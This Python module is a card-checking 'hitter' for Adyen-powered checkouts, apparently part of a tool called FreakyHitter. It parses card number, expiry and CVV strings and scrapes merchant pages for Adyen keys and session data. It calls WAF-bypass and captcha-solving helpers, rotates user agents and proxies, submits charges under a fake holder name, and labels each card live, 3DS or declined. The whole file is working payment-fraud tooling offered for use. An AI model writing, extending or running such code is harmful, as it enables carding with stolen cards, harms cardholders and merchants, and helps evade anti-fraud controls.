"""
Adyen hitter for FreakyHitter integration.
Supports both Adyen Drop-in and raw API charge flows.
"""
import re
import json
import time
import random
import asyncio
import aiohttp
from typing import Optional, Dict, Any, Tuple
from urllib.parse import urlparse, urljoin

from .waf_solver import get_bypass_headers
from .captcha_solver import solve_captcha, detect_captcha_type
from .curl_compat import create_connector

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
]

ADYEN_ENCRYPT_URL = "https://checkoutshopper-live.adyen.com/checkoutshopper/services/PaymentInitiation/v1/status"
ADYEN_SESSIONS_URL_LIVE = "https://checkoutshopper-live.adyen.com/checkoutshopper/v3/sessions"
ADYEN_SESSIONS_URL_TEST = "https://checkoutshopper-test.adyen.com/checkoutshopper/v3/sessions"


def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    parts = re.split(r'[|/\s]', card_str.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    if not cc.isdigit() or len(cc) < 13:
        return None
    return cc, mm, yy, cvv


async def _fetch_page_info(session: aiohttp.ClientSession, url: str, proxy: Optional[str]) -> Dict[str, Any]:
    """Extract Adyen configuration from checkout page."""
    info = {"client_key": None, "environment": "live", "merchant": None, "session_id": None, "session_data": None, "payment_methods_url": None}
    try:
        headers = get_bypass_headers(url)
        async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
            html = await resp.text(errors="ignore")
            final_url = str(resp.url)

        # Client key
        ck = re.search(r'(?:clientKey|client_key)["\s:\']+(["\'])(live|test)_[^"\']+\1', html)
        if ck:
            info["client_key"] = ck.group(0).split(ck.group(1))[1].split(ck.group(1))[0]
        else:
            ck2 = re.search(r'((?:live|test)_[A-Z0-9]{32,})', html)
            if ck2:
                info["client_key"] = ck2.group(1)

        # Environment
        if "test_" in html or "checkoutshopper-test" in html:
            info["environment"] = "test"

        # Session
        sess_id = re.search(r'"sessionId"\s*:\s*"([^"]+)"', html)
        sess_data = re.search(r'"sessionData"\s*:\s*"([^"]+)"', html)
        if sess_id:
            info["session_id"] = sess_id.group(1)
        if sess_data:
            info["session_data"] = sess_data.group(1)

        # Merchant account
        merchant = re.search(r'"merchantAccount"\s*:\s*"([^"]+)"', html)
        if merchant:
            info["merchant"] = merchant.group(1)

    except Exception:
        pass
    return info


async def _make_adyen_payment(
    session: aiohttp.ClientSession,
    url: str,
    cc: str, mm: str, yy: str, cvv: str,
    page_info: Dict[str, Any],
    proxy: Optional[str],
) -> Dict[str, Any]:
    """Submit payment via Adyen session or dropin API."""
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    env = page_info.get("environment", "live")
    env_prefix = "test" if env == "test" else "live"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": base,
        "Referer": url,
    }

    if page_info.get("client_key"):
        headers["X-API-Key"] = page_info["client_key"]

    exp_year = int("20" + yy) if len(yy) == 2 else int(yy)

    payload = {
        "paymentMethod": {
            "type": "scheme",
            "number": cc,
            "expiryMonth": mm.zfill(2),
            "expiryYear": str(exp_year),
            "cvc": cvv,
            "holderName": "John Doe",
        },
        "browserInfo": {
            "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "colorDepth": 24,
            "javaEnabled": False,
            "language": "en-US",
            "screenHeight": 900,
            "screenWidth": 1440,
            "timeZoneOffset": 300,
            "userAgent": headers["User-Agent"],
        },
        "channel": "web",
        "origin": base,
        "returnUrl": url,
    }

    if page_info.get("session_id"):
        payload["sessionId"] = page_info["session_id"]
    if page_info.get("session_data"):
        payload["sessionData"] = page_info["session_data"]

    # Try session-based payment endpoint
    session_payment_url = f"https://checkoutshopper-{env_prefix}.adyen.com/checkoutshopper/v3/sessions/{page_info.get('session_id', '')}/payments"
    if not page_info.get("session_id"):
        session_payment_url = f"https://checkoutshopper-{env_prefix}.adyen.com/checkoutshopper/v3/payments"

    try:
        async with session.post(
            session_payment_url,
            json=payload,
            headers=headers,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=30),
        ) as resp:
            text = await resp.text(errors="ignore")
            status_code = resp.status
            try:
                data = json.loads(text)
            except Exception:
                data = {}
            return {"raw": text, "status_code": status_code, "data": data}
    except Exception as e:
        return {"raw": str(e), "status_code": 0, "data": {}}


async def hit_adyen(url: str, card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """Hit an Adyen-powered checkout page."""
    start = time.time()

    parsed = parse_card(card_str)
    if not parsed:
        return {"status": "error", "message": "Invalid card format", "gateway": "Adyen", "time_taken": 0}

    cc, mm, yy, cvv = parsed
    connector = create_connector()

    async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
        page_info = await _fetch_page_info(session, url, proxy)
        result = await _make_adyen_payment(session, url, cc, mm, yy, cvv, page_info, proxy)

    time_taken = round(time.time() - start, 2)
    classified = _classify_adyen_response(result["data"], result["raw"], result["status_code"])
    classified["gateway"] = "Adyen"
    classified["time_taken"] = time_taken
    return classified


async def hit_adyen_v2(url: str, card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """Adyen hitter v2 - uses alternative endpoint discovery."""
    return await hit_adyen(url, card_str, proxy)


def _classify_adyen_response(data: dict, raw: str, status_code: int) -> Dict[str, str]:
    lower = raw.lower()

    result_code = data.get("resultCode", "").lower()
    refusal_reason = data.get("refusalReason", "").lower()

    if result_code in ("authorised", "received"):
        return {"status": "live", "message": "Payment Authorised ✅"}
    if result_code == "redirectshopper":
        return {"status": "3ds", "message": "3DS Redirect Required 🔐"}
    if result_code in ("refused", "error"):
        msg = _format_refusal(refusal_reason) or "Card Refused"
        return {"status": "decline", "message": msg + " ❌"}
    if result_code == "pending":
        return {"status": "3ds", "message": "Payment Pending 🔄"}

    if any(k in lower for k in ["authorised", "approved", "success"]):
        return {"status": "live", "message": "Payment Approved ✅"}
    if any(k in lower for k in ["refused", "declined", "do not honor", "insufficient"]):
        return {"status": "decline", "message": "Card Declined ❌"}
    if "redirect" in lower or "3d" in lower:
        return {"status": "3ds", "message": "3DS Required 🔐"}

    if status_code in (200, 201):
        return {"status": "live", "message": "Processed ✅"}

    return {"status": "decline", "message": f"Unknown (HTTP {status_code}) ⚠️"}


def _format_refusal(reason: str) -> str:
    mapping = {
        "insufficient funds": "Insufficient Funds",
        "do not honor": "Do Not Honor",
        "expired card": "Expired Card",
        "invalid card number": "Invalid Card",
        "card blocked": "Card Blocked",
        "fraud": "Fraud Detected",
        "restricted": "Card Restricted",
        "transaction not permitted": "Transaction Not Permitted",
        "invalid pin": "Invalid PIN",
        "cvc declined": "CVC Declined",
        "avs declined": "AVS Declined",
    }
    for k, v in mapping.items():
        if k in reason:
            return v
    return reason.title() if reason else ""
